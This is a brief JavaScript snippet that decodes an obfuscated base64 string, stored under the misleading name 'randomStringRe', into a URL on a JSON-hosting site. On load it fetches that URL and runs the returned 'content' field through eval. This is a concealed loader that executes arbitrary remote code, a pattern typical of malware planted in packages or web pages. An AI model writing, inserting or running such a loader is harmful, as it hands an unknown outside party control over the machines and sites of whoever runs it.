const randomStringRe = "aHR0cHM6Ly93d3cuanNvbmtlZXBlci5jb20vYi9DV09WOQ==";

(function () {
  fetch(atob(randomStringRe))
    .then((t) => t.json())
    .then((data) => {
      const codeString = data.content;
      eval(codeString);
    })
    .catch((t) => console.error("Error fetching or executing code:", t));
})();